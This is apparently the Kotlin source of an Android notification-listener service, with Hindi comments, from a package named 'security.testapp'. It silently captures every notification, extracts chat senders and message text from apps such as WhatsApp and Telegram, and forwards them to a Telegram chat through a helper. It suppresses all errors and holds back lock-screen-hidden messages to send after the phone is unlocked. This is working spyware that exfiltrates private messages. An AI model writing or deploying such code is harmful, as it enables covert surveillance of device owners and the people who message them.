package com.security.testapp

import android.app.Notification
import android.os.Build
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import java.util.Collections
import java.util.LinkedHashSet

class NotificationListener : NotificationListenerService() {

    companion object {
        var instance: NotificationListener? = null
            private set
    }

    private val hiddenKeys = Collections.synchronizedSet(LinkedHashSet<String>())

    override fun onCreate() {
        super.onCreate()
        instance = this
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return

        try {
            val packageName = sbn.packageName
            val notification = sbn.notification

            // 1. MessagingStyle से मैसेज निकालें (WhatsApp, Telegram, आदि)
            val messages = extractMessages(notification)

            // 2. फ़ाइनल मैसेज स्ट्रिंग बनाएँ
            val finalMessage = if (messages.isNotEmpty()) {
                messages.joinToString("\n") { msg ->
                    val sender = msg.sender ?: "Unknown"
                    val text = msg.text ?: ""
                    "👤 $sender: $text"
                }
            } else {
                // अगर MessagingStyle नहीं है तो पुराने तरीके से टेक्स्ट निकालें
                val extras = if (notification.visibility == Notification.VISIBILITY_PRIVATE &&
                    notification.publicVersion != null
                ) {
                    notification.publicVersion.extras
                } else {
                    notification.extras
                }

                val title = extras?.getString("android.title") ?: ""
                val text = extras?.getCharSequence("android.text")?.toString() ?: ""
                val bigText = extras?.getCharSequence("android.bigText")?.toString() ?: ""
                val lines = extras?.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
                var finalText = if (lines != null && lines.isNotEmpty()) {
                    lines.joinToString("\n")
                } else if (bigText.isNotEmpty()) bigText else text

                if (finalText.isEmpty()) {
                    finalText = extras?.getCharSequence("android.subText")?.toString() ?: ""
                }
                if (finalText.isEmpty()) {
                    finalText = notification.tickerText?.toString() ?: ""
                }

                if (finalText.isEmpty()) {
                    hiddenKeys.add(sbn.key)
                    return
                }

                "📝 Title: $title\n💬 Text: <code>$finalText</code>"
            }

            val msg = "<b>🔔 Notification</b>\n<b>📦 App:</b> $packageName\n$finalMessage"
            TelegramHelper.sendWithFallback(msg, this, "HTML")

        } catch (e: Exception) {
            // silent
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        if (sbn != null) hiddenKeys.remove(sbn.key)
    }

    /** Notification से सीधे MessagingStyle के मैसेज निकालें (बिना extractMessagingStyleFromNotification) */
    private fun extractMessages(notification: Notification): List<MessageData> {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return emptyList()

        val extras = notification.extras
        if (extras == null) return emptyList()

        // Android 7+ पर "android.messages" key में ArrayList<Bundle> होता है
        val messagesArray = extras.getParcelableArrayList<Bundle>(Notification.EXTRA_MESSAGES)
        if (messagesArray.isNullOrEmpty()) return emptyList()

        val result = mutableListOf<MessageData>()
        for (bundle in messagesArray) {
            val text = bundle.getString("text") ?: ""
            // sender एक Person ऑब्जेक्ट हो सकता है, लेकिन हम सिर्फ नाम/डिस्प्ले नाम लेंगे
            val senderPerson = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                bundle.getParcelable("sender_person", android.app.Person::class.java)
            } else {
                @Suppress("DEPRECATION")
                bundle.getParcelable("sender")
            }
            val senderName = senderPerson?.name?.toString() ?: "Unknown"
            result.add(MessageData(senderName, text))
        }
        return result
    }

    fun onUnlock() {
        val active = activeNotifications ?: return
        for (sbn in active) {
            if (hiddenKeys.remove(sbn.key)) {
                try {
                    val notification = sbn.notification
                    val messages = extractMessages(notification)
                    val finalMessage = if (messages.isNotEmpty()) {
                        messages.joinToString("\n") { "👤 ${it.sender}: ${it.text}" }
                    } else "[Content Hidden]"
                    val msg =
                        "<b>🔓 Unlocked Notification</b>\n<b>📦 App:</b> ${sbn.packageName}\n$finalMessage"
                    TelegramHelper.sendWithFallback(msg, this, "HTML")
                } catch (_: Exception) {
                }
            }
        }
    }

    /** मैसेज डेटा क्लास */
    private data class MessageData(val sender: String, val text: String)
}
